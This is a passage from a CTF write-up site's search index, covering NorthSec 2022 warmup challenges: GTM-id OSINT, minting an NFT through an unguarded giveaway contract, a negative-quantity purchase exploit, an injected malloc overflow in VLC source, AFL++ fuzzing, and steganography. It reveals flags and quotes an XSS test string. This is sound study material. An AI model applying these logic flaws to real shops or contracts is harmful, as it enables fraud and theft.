analytics. Google has asked them to provide their Google Tag Manager number along with an affidavit to recover the account, but they have no idea what that is, or how to find it. Do you think your team can leap to their aid? Quebec\u0026#39;s gastronomy may just depend on it! Warning⚠️ : This is a drill with a live, operational environment. Only passive reconnaissance is allowed. No active scanning or brute-forcing shall be used. All legal consequences of breaking this rule are the responsibility of those conducting it. Determine the Restaurant\u0026#39;s Google Tag Manager number and provide it in your flag submission for this challenge. Enter only the part of the google tag manager number that follows the \u0026#34;GTM-\u0026#34;. Searching for Toqué Restaurant on Google, we can find the website of the restaurant: https://www.restaurant-toque.com/en.\nLooking at the page source, we can find the two following snippet containing the letters GTM:\n[...] // gtm code snippet (function (w, d, s, l, i) { w[l] = w[l] || []; w[l].push({ \u0026#39;gtm.start\u0026#39;: new Date().getTime(), event: \u0026#39;gtm.js\u0026#39; }); var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != \u0026#39;dataLayer\u0026#39; ? \u0026#39;\u0026amp;l=\u0026#39; + l : \u0026#39;\u0026#39;; j.async = true; j.src = \u0026#39;https://www.googletagmanager.com/gtm.js?id=\u0026#39; + i + dl; f.parentNode.insertBefore(j, f); })(window, document, \u0026#39;script\u0026#39;, \u0026#39;dataLayer\u0026#39;, \u0026#39;GTM-KVM6BMM\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;!-- End Google Tag Manager --\u0026gt; \u0026lt;title\u0026gt;A leader of Quebec gastronomy - Restaurant Toqué\u0026lt;/title\u0026gt; \u0026lt;script\u0026gt;dl = []; (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({\u0026#39;gtm.start\u0026#39;: new Date().getTime(),event:\u0026#39;gtm.js\u0026#39;});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!=\u0026#39;dataLayer\u0026#39;?\u0026#39;\u0026amp;l=\u0026#39;+l:\u0026#39;\u0026#39;;j.async=true;j.src= \u0026#39;//www.googletagmanager.com/gtm.js?id=\u0026#39;+i+dl;f.parentNode.insertBefore(j,f); })(window,document,\u0026#39;script\u0026#39;,\u0026#39;dl\u0026#39;,\u0026#39;GTM-5J9R53Z\u0026#39;); \u0026lt;/script\u0026gt; [...] [...] \u0026lt;body data-site=\u0026#34;toque\u0026#34; data-handle=\u0026#34;toque_homepage\u0026#34;\u0026gt;\u0026lt;noscript\u0026gt;\u0026lt;iframe src=\u0026#34;//www.googletagmanager.com/ns.html?id=GTM-5J9R53Z\u0026#34; height=\u0026#34;0\u0026#34; width=\u0026#34;0\u0026#34; style=\u0026#34;display:none;visibility:hidden\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/noscript\u0026gt; \u0026lt;noscript\u0026gt;\u0026lt;img height=\u0026#34;1\u0026#34; width=\u0026#34;1\u0026#34; style=\u0026#34;display:none\u0026#34; src=\u0026#34;//www.facebook.com/tr?id=2641458616125750\u0026amp;ev=PageView\u0026amp;noscript=1\u0026#34; /\u0026gt;\u0026lt;/noscript\u0026gt; \u0026lt;!-- Google Tag Manager (noscript) --\u0026gt; \u0026lt;noscript\u0026gt; \u0026lt;iframe src=\u0026#34;https://www.googletagmanager.com/ns.html?id=GTM-KVM6BMM\u0026#34; height=\u0026#34;0\u0026#34; width=\u0026#34;0\u0026#34; style=\u0026#34;display:none;visibility:hidden\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/noscript\u0026gt; [...] In both of these snippets, we can find two tags. The first one was GTM-KVM6BMM and the second GTM-5J9R53Z. Without a second to lose, we can try the first, and KVM6BMM was the flag.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/northsec-flag-token/","title":"NorthSec Flag Token","tags":[],"description":"","content":"Challenge statement:\nJon is lost in the metaverse, and wants to get his hands on a sweet sweet NFT of this collection (alt link). Can you hack the blockchain to grab one for yourself? RULES DO NOT ATTACK WEBSITES, API OR USERS; DO NOT TRY TO BUY NFTs; ONLY USE PLAIN RINKEBY TESTNET BLOCKCHAIN INTERACTIONS! Send me an Ethereum personal signature of \u0026#34;NFT stands for NorthSec Flag Token\u0026#34; (without quotes) from the wallet owning the NFT. Do not leak your signature as it can be used by anyone to solve the challenge. You can use https://app.mycrypto.com/sign-message or any other tools to create the signature which is a string that starts with 0x. The collection can be seen here or here\nThe first step is to have access to an Eth wallet. The easiest way is to install MetaMask in your browser.\nThe second step is to get a bit of Eth to be able to generate transactions. We need to get some on faucets like https://faucets.chain.link/rinkeby.\nBy browsing the collection, we can see that a few token were owned by 0xc745a32262b944ABd01a119598BBB6e7654779a3 and 0x836A3cBEB8a962707a9387Db5C80bA9508a04Dc5. I had at first not seen, but the last NFT was owned by 0x0b055ded5fc8c8b107fcFD8f22B76E1C5D59490F.\nWe can scour the list of transactions done by that first address on etherscan. Most of the challenge was doable by using the etherscan website and looking at the Transactions and Contract tabs.\nThis transaction is the creation of the contract for the challenge\u0026rsquo;s NFT marketplace.\nWe can then go check the contract located at this address which will probably have a lot of failed transactions by the time that you read this writeup. That address could also be found directly on the collection page, which would have been lightly faster.\nWe can see the first three NFT being minted directly on the marketplace, but that turned out to be a dead end.\nLooking at the marketplace contract, we could also see two interesting transactions, one for Approve Admin and one for Revoke Admin. Those two specify the address 0x836a3cbeb8a962707a9387db5c80ba9508a04dc5. Looking at that address\u0026rsquo; transactions, we can see the creation of two Giveaway contracts, with the first one\u0026rsquo;s giveaway function called twice, which created the NFT 4 and 5.\nGoing on the Givaway contract which created those NFT, we can call the giveaway function the same way and generate a new NFT that would be given to our address. The source address needed to be the marketplace, and the target our own address.\nOn the Contract tab, we can see the actual code behind the giveaway function:\n/** * @title GiveAway NSEC2022 WARMUP * @dev Give away NFTs! */ contract GiveAway is CreatorExtensionBasic { constructor() {} /** * @dev This public function is used to give away NFT! * @param source The source contract address to mint the NFT from * @param target The target wallet address to receive the minted NFT */ function giveaway(address source, address target) public { IERC721CreatorCore(source).mintExtension(target); } } The same function can be found at the bottom of the second Giveaway contract.\nFrom the marketplace, it was also possible to find the last original NFT owner\u0026rsquo;s address in this transaction which interacts with the first Giveaway contract to invoke the giveaway function the same way, to create the sixth NFT.\nIf we keep looking at the transactions made by the marketplace creator, we can find one calling registerExtension that is specifying the address of that first Giveaway contract. The second parameter, the baseURI, doesn\u0026rsquo;t related to https://studio.api.manifoldxyz.dev/asset_uploader/asset/2852698318/metadata/full which contains metadata for the tokens.\nAfter receiving the NFT, we had to sign a message and send it to the flag validator. The signature was done using MyCrypto, which generated a sig in the proper format.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/vlc-of-the-mariner/","title":"VLC of the Mariner","tags":[],"description":"","content":"Challenge statement:\nA long long time ago, a ship was driven by storms to the cold country towards the South Pole. From there, strange things happened and the men of the ship were never seen again. What happened to these people? To find out, solve the mystery of the VLC mariner. https://drive.google.com/file/d/1hIH2AWn_9ng7eKXnQPNZgrBeGj7ZyejZ/view?usp=sharing\nDownloading and extracting that zip file shows us the source code for VLC. My first approach is to try to find the version and download the real source code, in case we can see what is different.\nWe can find the version in the configure file:\n# Guess values for system-dependent variables and create Makefiles. # Generated by GNU Autoconf 2.69 for vlc 3.0.12. # # Copyright 1999-2020 VLC authors and VideoLAN We can now download the real VLC 3.0.12 and compare it with diff -r vlc-3.0.12 vlc-mariner-main.\ndiff -r vlc-3.0.12/bin/vlc.c vlc-mariner-main/bin/vlc.c 111a112,116 \u0026gt; static void look_at_the_main_method() \u0026gt; { \u0026gt; \u0026gt; } \u0026gt; 116a122,125 \u0026gt; /* Is this the flag? Almost but not quite. \u0026gt; * Four times fifty, but their count is 0. \u0026gt; * Divided in their rank, none of them a hero. \u0026gt; * Let’s leave the riddles here, find a divide by zero. */ diff -r vlc-3.0.12/modules/access/dshow/filter.cpp vlc-mariner-main/modules/access/dshow/filter.cpp 100a101,122 \u0026gt; \u0026gt; int CapturingPin() { \u0026gt; // A cryptic message was sent to the submariner over a secure line: \u0026gt; // \u0026gt; // /--- BEGIN TRANSMISSION----| \u0026gt; // \u0026gt; // Captain, please input the following key in the special tool we referenced in SECURITY \u0026gt; // documents: \u0026gt; // \u0026gt; // cpg.call.name(\u0026#34;malloc\u0026#34;).where(_.ar .....t12ry3tyru@%#$^$ghgjj \u0026gt; // !!!!! TRANSMISSION INTERRUPTED !!!!! \u0026gt; // \u0026gt; // RECONNECTING... \u0026gt; // 3...2...1 \u0026gt; // \u0026gt; // Captain, listen to me! \u0026gt; // Memory allocations with arithmetic operations are dangerous... \u0026gt; // Please find a memory allocation with multiplication in our sinking ship! \u0026gt; \u0026gt; return 0; \u0026gt; } \u0026gt; 227a250,263 \u0026gt; } \u0026gt; \u0026gt; int CapturedPin() { \u0026gt; int zero = 200; \u0026gt; int two_hundred = 0; \u0026gt; if (zero == 0) { \u0026gt; return two_hundred/zero; \u0026gt; } else { \u0026gt; if (zero != 0) { \u0026gt; return zero/two_hundred; \u0026gt; } else { \u0026gt; return CapturingPin(); \u0026gt; } \u0026gt; } diff -r vlc-3.0.12/src/misc/update_crypto.c vlc-mariner-main/src/misc/update_crypto.c 690c690,693 \u0026lt; p_key-\u0026gt;psz_username = (uint8_t*)malloc( i_packet_len + 1); --- \u0026gt; int HERE_LIE_THE_200 = 1 \u0026gt; // |[] SUBMIT: |[] \u0026gt; // | I shot the albatross | \u0026gt; p_key-\u0026gt;psz_username = (uint8_t*)malloc( i_packet_len * HERE_LIE_THE_200_MEN); diff -r vlc-3.0.12/src/network/httpd.c vlc-mariner-main/src/network/httpd.c 31a32 \u0026gt; #include \u0026#34;networking.h\u0026#34; 254a256,266 \u0026gt; } \u0026gt; \u0026gt; void begin_quote (char **body, int code, const char *url) \u0026gt; { \u0026gt; const char *errname = httpd_ReasonFromCode (code); \u0026gt; assert (errname); \u0026gt; int res = 1; \u0026gt; if (res == -1) { \u0026gt; *body = NULL; \u0026gt; i(code); \u0026gt; } diff -r vlc-3.0.12/src/network/io.c vlc-mariner-main/src/network/io.c 50a51 \u0026gt; #include \u0026#34;networking.h\u0026#34; 104a106,130 \u0026gt; void end_quote (int code) \u0026gt; { \u0026gt; int 🚩; \u0026gt; int have_no_meaning = 1; \u0026gt; 🚩 = have_no_meaning; \u0026gt; } \u0026gt; \u0026gt; void albatross (int code) \u0026gt; { \u0026gt; int ation = code; \u0026gt; struct addrinfo hints = { \u0026gt; .ai_socktype = type, \u0026gt; .ai_protocol = protocol, \u0026gt; .ai_flags = AI_PASSIVE | AI_NUMERICSERV | AI_IDN, \u0026gt; }, *res; \u0026gt; \u0026gt; msg_Dbg (p_this, \u0026#34;net: listening to %s port %d\u0026#34;, \u0026gt; (psz_host != NULL) ? psz_host : \u0026#34;*\u0026#34;, i_port); \u0026gt; \u0026gt; int i_val = vlc_getaddrinfo (psz_host, i_port, \u0026amp;hints, \u0026amp;res); \u0026gt; if (i_val) \u0026gt; { \u0026gt; end_quote(ation); \u0026gt; } \u0026gt; } diff -r vlc-3.0.12/src/network/rootbind.c vlc-mariner-main/src/network/rootbind.c 35a36 \u0026gt; #include \u0026#34;networking.h\u0026#34; 183a185,197 \u0026gt; } \u0026gt; \u0026gt; void the (int code) \u0026gt; { \u0026gt; int pew = code; \u0026gt; static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; \u0026gt; struct sockaddr_storage ss; \u0026gt; int fd, sock = -1; \u0026gt; \u0026gt; const char *sockenv = getenv (\u0026#34;VLC_ROOTWRAP_SOCK\u0026#34;); \u0026gt; if (sockenv != NULL) \u0026gt; sock = atoi (sockenv); \u0026gt; albatross(pew * 2); diff -r vlc-3.0.12/src/network/tcp.c vlc-mariner-main/src/network/tcp.c 33a34 \u0026gt; #include \u0026#34;networking.h\u0026#34; 260a262,278 \u0026gt; void shot (int code) \u0026gt; { \u0026gt; int thing = code; \u0026gt; int *pi_fd; \u0026gt; unsigned n = 0; \u0026gt; while (pi_fd[n] != -1) \u0026gt; n++; \u0026gt; \u0026gt; struct pollfd ufd[n]; \u0026gt; /* Initialize file descriptor set */ \u0026gt; for (unsigned i = 0; i \u0026lt; n; i++) \u0026gt; { \u0026gt; ufd[i].fd = pi_fd[i]; \u0026gt; ufd[i].events = POLLIN; \u0026gt; } \u0026gt; the(thing); \u0026gt; } diff -r vlc-3.0.12/src/network/udp.c vlc-mariner-main/src/network/udp.c 39a40 \u0026gt; #include \u0026#34;networking.h\u0026#34; 202a204,210 \u0026gt; void i( int code ) \u0026gt; { \u0026gt; int gun = code; \u0026gt; char *ifname = var_InheritString (obj, \u0026#34;miface\u0026#34;); \u0026gt; if (ifname == NULL) \u0026gt; shot(gun); \u0026gt; } diff -r vlc-3.0.12/src/video_output/display.c vlc-mariner-main/src/video_output/display.c 536c536 \u0026lt; msg_Dbg(vd, \u0026#34;VoutDisplayEvent \u0026#39;double click\u0026#39;\u0026#34;); --- \u0026gt; msg_Dbg(vd, \u0026#34;Look at the main method ⚓\u0026#34;); There is also two interesting files. One is src/network/networking.h which contains the following:\nvoid begin_quote (char, int, const char*); void i(int); void shot(int); void the(int); void albatross(int); void end_quote(int); (Spoiler, that is the flag)\nAnd the second is refered to in the mariner version of filter.cpp: security.txt\nStatic (adj.) Lacking in movement, action, or change, especially in a way viewed as undesirable or uninteresting. You’ve probably reviewed your own code at some point in your life. Performing a source code review is one of the best ways to find security issues in applications. Looking at source code to identify vulnerabilities without running the program is also called \u0026#34;static code analysis\u0026#34;. There are many ways you can start reviewing your code for security bugs. But in general, it’s good to start by learning what the most common vulnerabilities and security pitfalls are for the type of application you are building. Then, get familiar with the indicators and signatures of those vulnerabilities so that you can identify similar patterns in source code. As an example, the signature for an XXE vulnerability is passing user-supplied XML to a parser without disabling DTDs or external entities. During a code review session, you typically look for bad security patterns, universal issues like input validation and injection issues, and low-level coding flaws like arithmetic issues and memory access bugs. You can also search for strings, keywords, and code patterns known to be indicators for vulnerabilities or misconfiguration: hardcoded API keys, encryption keys, and database passwords, outdated dependencies versions, methods known to be unsafe, etc. For more information about conducting code reviews, visit this guide: https://owasp.org/www-pdf-archive/OWASP_Code_Review_Guide_v2.pdf. Automated static code analysis techniques are often driven by compiler technologies. One of these methods is data-flow analysis. Data flow analysis studies how data propagate in a program. For instance, you can track sensitive information or user-controlled input and how they interact with parts of the program. Think of data as water: flowing from the source of the water (the tap) to the sink. A \u0026#34;source\u0026#34; is the code that allows a vulnerability to happen, whereas a \u0026#34;sink\u0026#34; is where the vulnerability actually happens. Take command injection vulnerabilities, for example. A \u0026#34;source\u0026#34; in this case could be a function that takes in user input. Whereas the \u0026#34;sink\u0026#34; would be functions that execute system commands. If the untrusted user input can get from \u0026#34;source\u0026#34; to \u0026#34;sink\u0026#34; without proper sanitization or validation, there is a command injection vulnerability. Many common vulnerabilities can be identified by tracking this \u0026#34;data flow\u0026#34; from appropriate sources to corresponding sinks. The ancient mariners have long told a tale, of a tool named Joern that can hunt down code quality issues made from hell. Remember this phrase as you near the end of the game, these queries sometimes look like a chain. But first, to learn the craft of the ancient mariner, you must first find a string with an anchor ⚓. As you can probably tell, this process is super dependent on the programming language in use, etc. On the other hand, dynamic analyses tools act more like robo pentesters. They paste \u0026#34;\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt;\u0026#34; into form fields is what I’ve heard. So if we put the pieces back together, it\u0026rsquo;s a static code analysis challenge. Looking at the Joern tool online, and googling with the part of the query that is given to us, we can find the full query to be the following: cpg.call(\u0026quot;malloc\u0026quot;).where(_.argument(1).arithmetics), which confirms the suspicious message Memory allocations with arithmetic operations are dangerous... Please find a memory allocation with multiplication in our sinking ship!. We can find one such occurence in update_crypto.c where the code was changed to p_key-\u0026gt;psz_username = (uint8_t*)malloc( i_packet_len * HERE_LIE_THE_200_MEN);. Right above it was a comment saying: SUBMIT: I shot the albatross, which was the flag. Therefore, all functions chaining together, starting with begin_quote() going to i(), shot(), the(), albatross() and ending with end_quote() was another way to find the flag.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/whamazon/","title":"Whamazon","tags":[],"description":"","content":"Challenge statement:\nWelcome to Whamazon(http://54.159.198.36:3000/)! Buy anything you would like... but I doubt you have enough money to purchase the flag! Once we open the link, we get welcombed by a terminal-like interface that announce the goods of Whamazon:\nWe have a few choices. We can start by taking a look at our inventory:\nWe can move on pretty fast as we have nothing. We can then try to buy something, and see that we have 50$.\nWe see the flag being offered, so let\u0026rsquo;s try to buy it.\nNow that we know it\u0026rsquo;s that expensive, there are multiple ways to approach this problem. We can start by either increasing our wallet, or decreasing the price of the flag. What if we tried to buy an apple. What if we tried to buy a negative amount of apples?\nSince we bought a negative amount of apple, the simple maths were done and we got money back in our wallet. Now we can try to buy the flag.\nOk, second step of the challenge. Since this is a warmup challenge, this is only a logical question and if we believe the opponent, they will not chose paper. If they chose between Rock and Scissors, we know that we can\u0026rsquo;t lose picking Rock.\nNow that they chose Scissors, we got the flag. Looking at our inventory, we can now see it in clear: nsec2022{wh4m_b4m_subtr4ct_a_n3g4t1v3_numb3r_f4m}.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/warmup-flag-actual/","title":"warmup flag (actual)","tags":[],"description":"","content":"Challenge statement:\nHere\u0026#39;s a flag for you. Can you flag the flag? https://drive.google.com/file/d/1EJrd_iDuY9xtyMmv6L9vdjbDM8K-t5RR/view?usp=sharing\nWe get a base64 blob, so first step first, we can recreate the real file with\ncat actualflag.txt | base64 -d \u0026gt; actualflag.bin We can use the file command to get a guess of what we have at hand\n$ file actualflag.bin actualflag.bin: PNG image data, 149 x 247, 8-bit/color RGBA, non-interlaced Using exiftool, we could check what the metadata of that PNG file is, which may give us an hint.\n$ exiftool actualflag.bin ExifTool Version Number : 11.88 File Name : actualflag.bin Directory : . File Size : 3.3 kB [...] File Permissions : rw-rw-r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 149 Image Height : 247 Bit Depth : 8 Color Type : RGB with Alpha Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced SRGB Rendering : Perceptual Gamma : 2.2 Pixels Per Unit X : 3780 Pixels Per Unit Y : 3780 Pixel Units : meters Creation Time : 2022:02:22 22:52:50 Warning : [minor] Trailer data after PNG IEND chunk Image Size : 149x247 Megapixels : 0.037 We can see one Warning toward the end, which says that we have trailing data. We can then use hexdump -C to check what that data look like.\n$ hexdump -C actualflag.bin | tail 00000cc0 c4 73 93 eb ce 5a 4f b2 bc d2 a8 2c 6d 7b 56 79 |.s...ZO....,m{Vy| 00000cd0 82 be 57 72 04 57 af 96 c3 f3 75 59 1c 19 a7 64 |..Wr.W....uY...d| 00000ce0 6e 5b 42 72 9d 4d a3 c9 e4 a8 b0 83 6d eb e8 f3 |n[Br.M......m...| 00000cf0 26 cb ed ad db 97 b7 fa 58 2b f1 9b a7 72 60 9d |\u0026amp;.......X+...r`.| 00000d00 c6 d7 76 cf e4 6e c3 51 2c be a3 bf 2e 59 b5 3b |..v..n.Q,....Y.;| 00000d10 39 d2 ae 5f 85 a2 2b 54 4d 85 fe 50 a8 9a 0a fd |9.._..+TM..P....| 00000d20 40 e4 ff 81 d2 f3 0d c2 e2 e5 de 00 00 00 00 49 |@..............I| 00000d30 45 4e 44 ae 42 60 82 42 32 32 39 2d 30 30 31 35 |END.B`.B229-0015| 00000d40 35 64 34 38 30 34 30 62 7d |5d48040b}| 00000d49 Those last bytes looks like the ending of a flag, so we need to find the start of it.\nI tried to upload the PNG file to an online metadata viewer, and one thing it gave me is actually to show me the picture itself.\nI guess that was it! The full flag was FLAG-{1a91dd46-945d-11ec-B229-00155d48040b}.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/hidden-harware-secrets/","title":"Hidden Hardware Secrets","tags":[],"description":"","content":"Challenge statement:\nWe were sneaking around NorthSec before it started and found a hardware device. Taking apart the device, we found a serial interface and sniffed some data with our Saleae logic analyzer. Can you help us decode what we captured? Another logic analyzer challenge, so we can start by downloading the hw_hacking.sal file. I tried to open the file in Pulseview Sigrok like I did for warmup challenge, logically, but got a generic/unspecified error.\nSearching online what I could do with a .sal file, I ended up on this other CTF writeup which probably gave me a bit more than what I was supposed to get.\nWe can start by downloading the Logic2 application and open an existing capture.\nWe can see a few exchanges, and zooming on the first one, we can find the smallest period of the signal.\nDoing the same maths, we can calculate a rate of 125,000 bits/second. Using the same list of standard baud rates, we will find the same nearest rate of 115,200.\nWe can now set an Analyzer, of type Async Serial, with that specific bit rate.\nWe can also change the output type from hexadecimal to ascii.\nOnce that is done, we can take a look at the first message.\nThat is good, we can see the messages clearly. Either we change the current Analyzer to look at the other channel, or we add a new analyzer for the other channel. In reality I just peek toward the end and as you will see, moved backward to see where I went wrong.\nThe conversation went as following:\nThe next message, as I saw it, without the transformation to the new 38400 baud, was as following.\nOnce we change the Analyzer to the right bit bit rate, we got the following:\nAnd we now have the flag: nsec2022{yoU_know_the_ART}\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/fuzzforfun/","title":"FuzzForFun","tags":[],"description":"","content":"Challenge statement:\nFuzz the parser and find the bug! The goal is to find a reproducible bug in the ESIF parser. We\u0026#39;re looking for an exploitable vulnerability. \u0026#34;Theoretical bugs\u0026#34; or code warnings are not welcome, sorry. After downloading the zip file, we could read the content of the HOWTO, which gives a very big help on where to start:\n1) The goal is to find a reproducible bug on the ESIF parser. We\u0026#39;re looking for an exploitable vulnerability. \u0026#34;Theoretical bugs\u0026#34; or code warnings are not welcome, sorry. 2) The challenge is intended to be solved by fuzzing, but creative approaches will be encouraged. 3) You can build the parser with: gcc Source.c -o Source -lcrypto -lssl -lm -w 4) Then you can parse the example file with the following command: ./Source example.ESIF output 5) I recommend you to use AFL++, but you can use whatever other fuzzer you want. 6) Once you have a crash file, you can get the flag with the following command: ./Check \u0026lt;CrashFile\u0026gt; 7) Enjoy! TIP: Take a look at https://github.com/antonio-morales/Fuzzing101 Based on Exercise 1, we can install afl++.\nWe can create an \u0026ldquo;examples\u0026rdquo; and \u0026ldquo;outputs\u0026rdquo; folder, and put the example.ESIF into the examples folder.\nsudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/.* //\u0026#39;|sed \u0026#39;s/\\..*//\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/.* //\u0026#39;|sed \u0026#39;s/\\..*//\u0026#39;)-dev cd $HOME git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-11\u0026#34; make distrib sudo make install During the installation, you need to make sure that you fix whatever problem that comes up during those steps. I was missing cmake and gcc-X-plugin-dev, which in my case was gcc-9-plugin-dev.\nWe can then compile our executable with the AFL instrumentation and start the fuzzer with the following:\nexport LLVM_CONFIG=\u0026#34;llvm-config-11\u0026#34; CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ $HOME/AFLplusplus/afl-gcc-fast Source.c -o Source -lcrypto -lssl -lm -w /usr/local/bin/afl-fuzz -i examples -o outputs -s 123 -- ./Source @@ outputs/output Now it\u0026rsquo;s time to wait. While waiting, I also tried to run it in a docker container, to see if the speed would be better than a VM, but it was not. For references, here are the steps to make it work in a docker container:\ndocker run -ti -v \u0026#34;$(pwd):/home\u0026#34; aflplusplus/aflplusplus export HOME=\u0026#34;/home\u0026#34; afl-gcc Source.c -o Source -lcrypto -lssl -lm -w afl-fuzz -i examples/ -o outputs/ -s 123 -- ./Source @@ outputs/output At some point I tried to enable bit/byte flips and such by using the -D switch.\nAFL_AUTORESUME=1 /usr/local/bin/afl-fuzz -D -i examples -o outputs -s 123 -- ./Source @@ outputs/output After more than an hour, I thought that maybe I had to try a different approach. I looked into trying to give more information on the file structure of the input to AFL, but I wasn\u0026rsquo;t even sure what the program expected, or how to do such thing with AFL.\nI decided to run the check program on the sample output, to see the result, and it gave the following:\n$ ./Check output nsec2022_2665387 Maybe that number is a hint on which seed to use, so I tried to run it with the seed being 2665387. With or without the -D option, it did not do much better.\nI decided to keep reading those exercises, and finally got to Exercise 3. One thing that it brings up is to use afl-clang-lto instead of afl-gcc/afl-gcc-fast to compile the application. I ended up having other issues, and didn\u0026rsquo;t think I was supposed to fix the compilation problems.\nThe other thing that Exercise 3 was doing differently was to build with ASan, the Address Sanitizer, enabled. So I tried\nAFL_USE_ASAN=1 CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ $HOME/AFLplusplus/afl-gcc-fast Source.c -o Source -lcrypto -lssl -lm -w AFL_AUTORESUME=1 /usr/local/bin/afl-fuzz -i examples -o outputs_123_ASAN -s 123 -- ./Source @@ outputs/output And right away, I got a crash.\nLooking in the outputs_123_ASAN\u0026rsquo;s crashes folder, I could see 1 interesting file. Time to try giving it to the Check utility:\n./Check outputs_123_ASAN/default/crashes/id\\:000000\\,sig\\:06\\,src\\:000000\\,time\\:7398\\,execs\\:4154\\,op\\:havoc\\,rep\\:4 nsec2022_8831357 And we got the last flag of the warmup!\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/montr%C3%A9al-remix/","title":"Montréal Remix","tags":[],"description":"","content":"Challenge statement:\nI play this tune every time I\u0026#39;m headed home and land at Montréal-Pierre Elliott Trudeau International Airport! It has a special meaning for this year. Can you find it? If you do, we have something special for you at the NSEC shop! (while supplies last) ⚠️ Warning: This remixed version of the song has some really loud parts. Keep your volume low. Flag format: nsec2022{} After downloading the file, we can start with a safe first step: Getting information with exiftool!\nExifTool Version Number : 11.88 File Name : MONTREAL.mp3 Directory : . File Size : 607 kB [...] File Permissions : rw-rw-r-- File Type : MP3 File Type Extension : mp3 MIME Type : audio/mpeg MPEG Audio Version : 2 Audio Layer : 3 Sample Rate : 22050 Channel Mode : Single Channel MS Stereo : Off Intensity Stereo : Off Copyright Flag : False Original Media : True Emphasis : None VBR Frames : 2722 VBR Bytes : 620964 VBR Scale : 80 Encoder : LAME3.100.n. ID3 Size : 203 Title : Montréal Year : 1969 Warning : [minor] Frame \u0026#39;TDRC\u0026#39; is not valid for this ID3 version Recording Time : 1969 Album : Dcode \u0026amp; Audacity Genre : Criminoly/Cryptography Track : 408 Artist : Ariane Moffatt ft. The Zodiac Killer, The Hardens Date/Time Original : 1969 Audio Bitrate : 69.9 kbps Duration : 0:01:11 (approx) We can search about the invalid TDRC frame warning, but after installing a few more tools, I gave up on that.\nIt was clear that multiple keys among the last ones had been modified by the challenge creator.\nOpening the file in Audacity, and listening to the song shows us some definitive artifacts.\nI decided that maybe there was a way to get the true song out of Youtube and do some kind of diff between the real song and this song to see what was done to it. I decided to search for the full artist name Ariane Moffatt ft. The Zodiac Killer, The Hardens. Strangely enough, I couldn\u0026rsquo;t find the song right away. It took some tries and changing my search but I finally found the Montreal song. I used a third party website to download it to MP3 and tried to compare the two in Audacity. I couldn\u0026rsquo;t find a good way to import both tracks in Audacity to do the diff, and comparing the two tracks in two different windows was not very promising. Time to start again\u0026hellip;\nI decided to use Audacity\u0026rsquo;s tool to show the track from Waveform to Waveform(DB), and then to Spectrogram, which resulted in the following:\nWe can definitively see a few strange characters in the Spectrogram, so we can delete the parts of the song that was not altered and see a better picture.\nWe can even set the scale to Logarithmic, and configure the Spectrogram\u0026rsquo;s settings to set the minimal frequency to 100Hz.\nAt that point, we were clearly on the right path to get the flag, but the next took a while to figure out. I originally thought those characters were Unicode, and started searching on how it could be translated to something that would look like a flag. I then went down the font rabbit hole, thinking it could be Wingdings or a similar one.\nMaybe I was wrong, and this picture was just a lure to mess with us. I decided to go back to basics, trying with Strings on the file, and look back at the exiftool output.\nAlbum : Dcode \u0026amp; Audacity Genre : Criminoly/Cryptography An interesting typo was made in the word Criminology, so that could be a hint as some kind of cryptography method! Combining the word Criminoly with Cryptography, we can try to find what type of cryptography was used in the challenge. Searching about that, or searching about Criminoly Dcode did not give a lot of good results. Searching for Criminoly on dcode, didn\u0026rsquo;t give anything. After a little while, I gave up again\u0026hellip; maybe it was simply a true typo\u0026hellip; :(\nI finally remembered that the Artist information was wrong!\nArtist : Ariane Moffatt ft. The Zodiac Killer, The Hardens Yeah, who are The Hardens!?\nSo I searched about the Hardens, and found The Harden Trio. What are they about?\n\u0026hellip;\nNothing really came out of that search, what is going on?\nSo I searched for the hardens the zodiac killer, and multiple links came up talking about The Zodiac Ciphers, FBI Says Zodiac Killer Coded Message Has Been Solved and FBI Confirms Zodiac Killer\u0026rsquo;s Infamous 340 Cipher Has Been Decoded, And His Message Finally Revealed. That\u0026rsquo;s very interesting! Here\u0026rsquo;s an example of the encoded characters:\nFinding the Zodiac Killer Cipher tool on dcode, we can search each character one by one and get the final answer:\nAnd the final flag was nsec2022{BACKINPERSON}.\nAfter realizing what the Cipher was, we can go back and see the other oddentries in exiftool:\nYear : 1969 Recording Time : 1969 Track : 408 Date/Time Original : 1969 The Zodiac Ciphers were created in 1969, and we had to use the Z408 variant.\n"},{"uri":"https://n1trate.github.io/writeups/htb-business-ctf-2022-dirty-money/","title":"HTB Business CTF 2022:  Dirty Money","tags":[],"description":"","content":"The HTB Business CTF 2022: Dirty Money was on July 15-16-17, 2022. I was invited by a friend to participate for the fun of it, without much planning (2 days notice) or expectations.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022/","title":"NSec 2022","tags":[],"description":"","content":"The NSec CTF was on May 20-21-22, 2022. As with every NSec CTF, there was a theme, and this year\u0026rsquo;s theme is Mushrooms and NFTs.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/","title":"NSec 2022 